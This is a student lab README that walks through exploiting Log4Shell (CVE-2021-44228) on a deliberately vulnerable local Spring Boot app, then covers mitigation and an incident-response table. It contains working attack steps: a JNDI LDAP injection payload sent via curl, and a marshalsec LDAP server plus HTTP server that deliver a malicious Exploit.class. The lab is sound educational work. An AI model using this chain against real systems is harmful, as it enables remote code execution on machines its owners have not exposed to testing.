
This project demonstrates the **Log4Shell (CVE-2021-44228)** vulnerability in a Spring Boot application using **Log4j 2.14.1**, 
and walks through a full exploit lifecycle with **MITRE ATT&CK/REACT** response phases and mitigation.

---
Project Structure:

HW9_Log4Shell/

├── log4shell-homework/        # Vulnerable Spring Boot app with Log4j 2.14.1

├── marshalsec/                # LDAPRefServer for JNDI exploit delivery

└── Exploit.java               # Malicious class payload (compiled and hosted)

---

Setup Instructions (AWS Linux 2)
1. Clone the Repo
 ```shell
git clone https://github.com/zilantix/HW9_Log4Shell.git
cd HW9_Log4Shell
 ```
2. Run Setup Script *(Optional)*
 ```shell
chmod +x setup_log4shell_lab.py
./setup_log4shell_lab.py
 ```

3. Manually Start LDAP Exploit Infrastructure
 ```shell
cd marshalsec
java -cp target/marshalsec-*-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<EC2-IP>:8000/#Exploit"
 ```
# In another terminal:
 ```shell
cd ~/exploit
python3 -m http.server 8000
 ```

---
Exploit Testing
 ```shell
curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:1389/a}' http://localhost:8080/log
 ```
Confirm `GET /Exploit.class` in your HTTP server logs.
---

Mitigation

- Patched input via validation in `LogController.java`:
 ```shell
java
if (input.contains("${jndi:")) {
    return "Invalid input detected";
}
 ```
- upgrade/change pom.xml on to Log4j 2.17.0 for full vendor patch

---
Incident Response (MITRE REACT)

| Phase     | Action                                        |
|-----------|-----------------------------------------------|
| Detect    | `docker logs` → saw `${jndi:` in input        |
| Contain   | `docker-compose down`                         |
| Eradicate | Confirmed no running containers               |
| Recover   | Redeployed patched version                    |
| Report    | Validated with sanitized test input           |



References

- [Apache Log4j Security Page](https://logging.apache.org/log4j/2.x/security.html)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Marshalsec LDAPRefServer](https://github.com/mbechler/marshalsec) Java Unmarshaller Security - Turning your data into code execution

---

📘 For educational use only. Not intended for real-world exploitation.
